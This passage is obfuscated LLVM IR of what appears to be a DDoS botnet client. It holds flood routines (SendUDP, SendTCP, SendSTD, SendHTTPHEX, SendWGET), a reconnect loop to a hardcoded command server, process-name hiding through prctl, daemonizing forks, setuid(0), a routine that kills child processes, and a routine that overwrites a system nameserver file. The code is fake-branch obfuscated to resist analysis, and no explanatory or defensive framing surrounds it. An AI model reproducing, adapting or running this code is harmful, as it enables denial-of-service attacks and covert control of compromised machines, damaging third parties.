  %1472 = load i8**, i8*** %4, align 8
  %1473 = getelementptr inbounds i8*, i8** %1472, i64 3
  %1474 = load i8*, i8** %1473, align 8
  %1475 = call i32 @atoi(i8* %1474) #9
  %1476 = trunc i32 %1475 to i16
  %1477 = load i8**, i8*** %4, align 8
  %1478 = getelementptr inbounds i8*, i8** %1477, i64 4
  %1479 = load i8*, i8** %1478, align 8
  %1480 = load i8**, i8*** %4, align 8
  %1481 = getelementptr inbounds i8*, i8** %1480, i64 5
  %1482 = load i8*, i8** %1481, align 8
  %1483 = call i32 @atoi(i8* %1482) #9
  %1484 = load i8**, i8*** %4, align 8
  %1485 = getelementptr inbounds i8*, i8** %1484, i64 6
  %1486 = load i8*, i8** %1485, align 8
  %1487 = call i32 @atoi(i8* %1486) #9
  call void @SendHTTPHEX(i8* %1468, i8* %1471, i16 zeroext %1476, i8* %1479, i32 %1483, i32 %1487)
  call void @exit(i32 0) #12
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %443
  %1488 = load i8**, i8*** %4, align 8
  %1489 = getelementptr inbounds i8*, i8** %1488, i64 0
  %1490 = load i8*, i8** %1489, align 8
  %1491 = call i32 @strcmp(i8* %1490, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.189, i32 0, i32 0)) #9
  %1492 = icmp ne i32 %1491, 0
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %468
  %1493 = load i8**, i8*** %4, align 8
  %1494 = getelementptr inbounds i8*, i8** %1493, i64 3
  %1495 = load i8*, i8** %1494, align 8
  %1496 = call i32 @atoi(i8* %1495) #9
  %1497 = icmp slt i32 %1496, 1
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %490
  %1498 = load i8**, i8*** %4, align 8
  %1499 = getelementptr inbounds i8*, i8** %1498, i64 5
  %1500 = load i8*, i8** %1499, align 8
  %1501 = call i32 @atoi(i8* %1500) #9
  %1502 = icmp slt i32 %1501, 1
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %512
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %556
  %1503 = load i8**, i8*** %4, align 8
  %1504 = getelementptr inbounds i8*, i8** %1503, i64 0
  %1505 = load i8*, i8** %1504, align 8
  %1506 = call i32 @strcmp(i8* %1505, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.190, i32 0, i32 0)) #9
  %1507 = icmp ne i32 %1506, 0
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %587
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %615
  %1508 = load i8*, i8** %11, align 8
  %1509 = call i8* @strtok(i8* %1508, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1509, i8** %13, align 8
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %659
  store i32 0, i32* %15, align 4
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %679
  %1510 = load i8*, i8** %11, align 8
  %1511 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %1510, i32 %1511)
  %1512 = load i32, i32* %15, align 4
  %_ = shl i32 %1512, 1
  %_83 = sub i32 0, %1512
  %gen = add i32 %_83, 1
  %_84 = sub i32 %1512, 1
  %gen85 = mul i32 %_84, 1
  %_86 = sub i32 0, %1512
  %gen87 = add i32 %_86, 1
  %_88 = sub i32 0, %1512
  %gen89 = add i32 %_88, 1
  %_90 = shl i32 %1512, 1
  %1513 = add nsw i32 %1512, 1
  store i32 %1513, i32* %15, align 4
  br label %originalBB82

originalBB94alteredBB:                            ; preds = %originalBB94, %713
  %1514 = load i8**, i8*** %4, align 8
  %1515 = getelementptr inbounds i8*, i8** %1514, i64 3
  %1516 = load i8*, i8** %1515, align 8
  %1517 = call i32 @atoi(i8* %1516) #9
  %1518 = icmp eq i32 %1517, -1
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %801
  %1519 = load i8*, i8** %22, align 8
  %1520 = load i32, i32* %17, align 4
  %1521 = load i32, i32* %18, align 4
  %1522 = load i32, i32* %19, align 4
  %1523 = load i32, i32* %20, align 4
  %1524 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %1519, i32 %1520, i32 %1521, i32 %1522, i32 %1523, i32 %1524)
  call void @_exit(i32 0) #11
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %830
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %861
  %1525 = load i32, i32* %3, align 4
  %1526 = icmp slt i32 %1525, 6
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %886
  %1527 = load i8**, i8*** %4, align 8
  %1528 = getelementptr inbounds i8*, i8** %1527, i64 2
  %1529 = load i8*, i8** %1528, align 8
  %1530 = call i32 @atoi(i8* %1529) #9
  %1531 = icmp eq i32 %1530, -1
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %926
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %943
  %1532 = load i8**, i8*** %4, align 8
  %1533 = getelementptr inbounds i8*, i8** %1532, i64 1
  %1534 = load i8*, i8** %1533, align 8
  store i8* %1534, i8** %23, align 8
  %1535 = load i8**, i8*** %4, align 8
  %1536 = getelementptr inbounds i8*, i8** %1535, i64 2
  %1537 = load i8*, i8** %1536, align 8
  %1538 = call i32 @atoi(i8* %1537) #9
  store i32 %1538, i32* %24, align 4
  %1539 = load i8**, i8*** %4, align 8
  %1540 = getelementptr inbounds i8*, i8** %1539, i64 3
  %1541 = load i8*, i8** %1540, align 8
  %1542 = call i32 @atoi(i8* %1541) #9
  store i32 %1542, i32* %25, align 4
  %1543 = load i8**, i8*** %4, align 8
  %1544 = getelementptr inbounds i8*, i8** %1543, i64 4
  %1545 = load i8*, i8** %1544, align 8
  store i8* %1545, i8** %26, align 8
  %1546 = load i32, i32* %3, align 4
  %1547 = icmp eq i32 %1546, 7
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %986
  %1548 = load i8**, i8*** %4, align 8
  %1549 = getelementptr inbounds i8*, i8** %1548, i64 5
  %1550 = load i8*, i8** %1549, align 8
  %1551 = call i32 @atoi(i8* %1550) #9
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1008
  store i32 %1009, i32* %28, align 4
  store i32 32, i32* %29, align 4
  %1552 = load i8*, i8** %23, align 8
  %1553 = call i8* @strstr(i8* %1552, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %1554 = icmp ne i8* %1553, null
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1032
  %1555 = load i8*, i8** %30, align 8
  %1556 = icmp ne i8* %1555, null
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1054
  %1557 = load i8*, i8** %30, align 8
  %1558 = load i32, i32* %24, align 4
  %1559 = load i32, i32* %25, align 4
  %1560 = load i8*, i8** %26, align 8
  %1561 = load i32, i32* %28, align 4
  %1562 = load i32, i32* %27, align 4
  %1563 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %1557, i32 %1558, i32 %1559, i8* %1560, i32 %1561, i32 %1562, i32 %1563)
  call void @_exit(i32 0) #11
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1078
  %1564 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1564, i8** %30, align 8
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1100
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1132
  %1565 = load i32, i32* %3, align 4
  %1566 = icmp slt i32 %1565, 4
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1164
  %1567 = load i8**, i8*** %4, align 8
  %1568 = getelementptr inbounds i8*, i8** %1567, i64 1
  %1569 = load i8*, i8** %1568, align 8
  store i8* %1569, i8** %31, align 8
  %1570 = load i8**, i8*** %4, align 8
  %1571 = getelementptr inbounds i8*, i8** %1570, i64 2
  %1572 = load i8*, i8** %1571, align 8
  %1573 = call i32 @atoi(i8* %1572) #9
  store i32 %1573, i32* %32, align 4
  %1574 = load i8**, i8*** %4, align 8
  %1575 = getelementptr inbounds i8*, i8** %1574, i64 3
  %1576 = load i8*, i8** %1575, align 8
  %1577 = call i32 @atoi(i8* %1576) #9
  store i32 %1577, i32* %33, align 4
  %1578 = load i8*, i8** %31, align 8
  %1579 = call i8* @strstr(i8* %1578, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %1580 = icmp ne i8* %1579, null
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1195
  %1581 = load i8*, i8** %31, align 8
  %1582 = call i8* @strtok(i8* %1581, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1582, i8** %34, align 8
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1214
  %1583 = load i8*, i8** %34, align 8
  %1584 = icmp ne i8* %1583, null
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1236
  %1585 = load i8*, i8** %34, align 8
  %1586 = load i32, i32* %32, align 4
  %1587 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %1585, i32 %1586, i32 %1587)
  call void @_exit(i32 0) #11
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1256
  %1588 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1588, i8** %34, align 8
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1274
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1299
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1323
  %1589 = load i64, i64* %36, align 8
  %1590 = load i64, i64* @numpids, align 8
  %1591 = icmp ult i64 %1589, %1590
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1356
  %1592 = load i32*, i32** @pids, align 8
  %1593 = load i64, i64* %36, align 8
  %1594 = getelementptr inbounds i32, i32* %1592, i64 %1593
  %1595 = load i32, i32* %1594, align 4
  %1596 = call i32 @kill(i32 %1595, i32 9) #5
  %1597 = load i32, i32* %35, align 4
  %_183 = sub i32 %1597, 1
  %gen184 = mul i32 %_183, 1
  %_185 = sub i32 %1597, 1
  %gen186 = mul i32 %_185, 1
  %_187 = sub i32 0, %1597
  %gen188 = add i32 %_187, 1
  %_189 = sub i32 %1597, 1
  %gen190 = mul i32 %_189, 1
  %_191 = sub i32 %1597, 1
  %gen192 = mul i32 %_191, 1
  %_193 = sub i32 %1597, 1
  %gen194 = mul i32 %_193, 1
  %1598 = add nsw i32 %1597, 1
  store i32 %1598, i32* %35, align 4
  br label %originalBB182

originalBB198alteredBB:                           ; preds = %originalBB198, %1381
  %1599 = load i64, i64* %36, align 8
  %_199 = shl i64 %1599, 1
  %_200 = sub i64 0, %1599
  %gen201 = add i64 %_200, 1
  %_202 = sub i64 %1599, 1
  %gen203 = mul i64 %_202, 1
  %1600 = add i64 %1599, 1
  store i64 %1600, i64* %36, align 8
  br label %originalBB198

originalBB207alteredBB:                           ; preds = %originalBB207, %1403
  br label %originalBB207
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = load i32, i32* @x.91
  %2 = load i32, i32* @y.92
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca %struct.in_addr, align 4
  %11 = bitcast %struct.in_addr* %10 to [4 x i8]*
  %12 = getelementptr inbounds [4 x i8], [4 x i8]* %11, i64 0, i64 0
  store i8 0, i8* %12, align 4
  %13 = bitcast %struct.in_addr* %10 to [4 x i8]*
  %14 = getelementptr inbounds [4 x i8], [4 x i8]* %13, i64 0, i64 1
  store i8 1, i8* %14, align 1
  %15 = bitcast %struct.in_addr* %10 to [4 x i8]*
  %16 = getelementptr inbounds [4 x i8], [4 x i8]* %15, i64 0, i64 2
  store i8 2, i8* %16, align 2
  %17 = bitcast %struct.in_addr* %10 to [4 x i8]*
  %18 = getelementptr inbounds [4 x i8], [4 x i8]* %17, i64 0, i64 3
  store i8 3, i8* %18, align 1
  %19 = bitcast %struct.in_addr* %10 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = load i32, i32* @x.91
  %22 = load i32, i32* @y.92
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %49 [
    i32 66051, label %29
    i32 50462976, label %46
    i32 33751041, label %47
    i32 16777986, label %48
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.91
  %31 = load i32, i32* @y.92
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  store i32 ptrtoint ([11 x i8]* @.str.199 to i32), i32* %9, align 4
  %38 = load i32, i32* @x.91
  %39 = load i32, i32* @y.92
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:46:                                     ; preds = %originalBBpart2
  store i32 ptrtoint ([14 x i8]* @.str.200 to i32), i32* %9, align 4
  br label %50

; <label>:47:                                     ; preds = %originalBBpart2
  store i32 ptrtoint ([13 x i8]* @.str.201 to i32), i32* %9, align 4
  br label %50

; <label>:48:                                     ; preds = %originalBBpart2
  store i32 ptrtoint ([16 x i8]* @.str.202 to i32), i32* %9, align 4
  br label %50

; <label>:49:                                     ; preds = %originalBBpart2
  store i32 ptrtoint ([8 x i8]* @.str.203 to i32), i32* %9, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %48, %47, %46, %originalBBpart24
  %51 = load i32, i32* %9, align 4
  ret i32 %51

originalBBalteredBB:                              ; preds = %originalBB, %0
  %52 = alloca i32, align 4
  %53 = alloca %struct.in_addr, align 4
  %54 = bitcast %struct.in_addr* %53 to [4 x i8]*
  %55 = getelementptr inbounds [4 x i8], [4 x i8]* %54, i64 0, i64 0
  store i8 0, i8* %55, align 4
  %56 = bitcast %struct.in_addr* %53 to [4 x i8]*
  %57 = getelementptr inbounds [4 x i8], [4 x i8]* %56, i64 0, i64 1
  store i8 1, i8* %57, align 1
  %58 = bitcast %struct.in_addr* %53 to [4 x i8]*
  %59 = getelementptr inbounds [4 x i8], [4 x i8]* %58, i64 0, i64 2
  store i8 2, i8* %59, align 2
  %60 = bitcast %struct.in_addr* %53 to [4 x i8]*
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %60, i64 0, i64 3
  store i8 3, i8* %61, align 1
  %62 = bitcast %struct.in_addr* %53 to i32*
  %63 = load i32, i32* %62, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  store i32 ptrtoint ([11 x i8]* @.str.199 to i32), i32* %9, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = load i32, i32* @x.93
  %21 = load i32, i32* @y.94
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = load i32, i32* @currentServer, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strcpy(i8* %28, i8* %32) #5
  store i32 23, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #9
  %36 = icmp ne i8* %35, null
  %37 = load i32, i32* @x.93
  %38 = load i32, i32* @y.94
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %52

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #9
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #9
  store i32 %49, i32* %3, align 4
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #9
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %originalBBpart2
  %53 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %53, i32* @mainCommSock, align 4
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %56 = load i32, i32* %3, align 4
  %57 = call i32 @connectTimeout(i32 %54, i8* %55, i32 %56, i32 30)
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

; <label>:59:                                     ; preds = %52
  store i32 1, i32* %1, align 4
  br label %61

; <label>:60:                                     ; preds = %52
  store i32 0, i32* %1, align 4
  br label %61

; <label>:61:                                     ; preds = %60, %59
  %62 = load i32, i32* %1, align 4
  ret i32 %62

originalBBalteredBB:                              ; preds = %originalBB, %19
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %64 = load i32, i32* @currentServer, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = call i8* @strcpy(i8* %63, i8* %67) #5
  store i32 23, i32* %3, align 4
  %69 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %70 = call i8* @strchr(i8* %69, i32 58) #9
  %71 = icmp ne i8* %70, null
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.198, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %37

; <label>:17:                                     ; preds = %8
  %18 = load i32, i32* @x.95
  %19 = load i32, i32* @y.96
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i16, i16* %1, align 2
  %27 = zext i16 %26 to i32
  %28 = call i32 @close(i32 %27)
  %29 = load i32, i32* @x.95
  %30 = load i32, i32* @y.96
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %originalBBpart2, %16
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %17
  %38 = load i16, i16* %1, align 2
  %39 = zext i16 %38 to i32
  %40 = call i32 @close(i32 %39)
  br label %originalBB
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %67

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* @x.97
  %50 = load i32, i32* @y.98
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %48
  %57 = load i32, i32* %7, align 4
  %58 = call i32 @waitpid(i32 %57, i32* %9, i32 0)
  call void @exit(i32 0) #12
  %59 = load i32, i32* @x.97
  %60 = load i32, i32* @y.98
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:67:                                     ; preds = %2
  %68 = load i32, i32* %7, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %113, label %70

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* @x.97
  %72 = load i32, i32* @y.98
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = call i32 @fork() #5
  store i32 %79, i32* %8, align 4
  %80 = icmp ne i32 %79, 0
  %81 = load i32, i32* @x.97
  %82 = load i32, i32* @y.98
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %80, label %89, label %106

; <label>:89:                                     ; preds = %originalBBpart24
  %90 = load i32, i32* @x.97
  %91 = load i32, i32* @y.98
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  call void @exit(i32 0) #12
  %98 = load i32, i32* @x.97
  %99 = load i32, i32* @y.98
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:106:                                    ; preds = %originalBBpart24
  %107 = load i32, i32* %8, align 4
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %110, label %109

; <label>:109:                                    ; preds = %106
  br label %111

; <label>:110:                                    ; preds = %106
  br label %111

; <label>:111:                                    ; preds = %110, %109
  br label %112

; <label>:112:                                    ; preds = %111
  br label %114

; <label>:113:                                    ; preds = %67
  br label %114

; <label>:114:                                    ; preds = %113, %112
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0)) #5
  %117 = call i32 @setuid(i32 0) #5
  %118 = call i32 @seteuid(i32 0) #5
  %119 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %120

; <label>:120:                                    ; preds = %126, %115
  %121 = call i32 @fork() #5
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %677

; <label>:123:                                    ; preds = %120
  %124 = call i32 @initConnection()
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %126, label %128

; <label>:126:                                    ; preds = %123
  %127 = call i32 @sleep(i32 5)
  br label %120

; <label>:128:                                    ; preds = %123
  %129 = load i32, i32* @mainCommSock, align 4
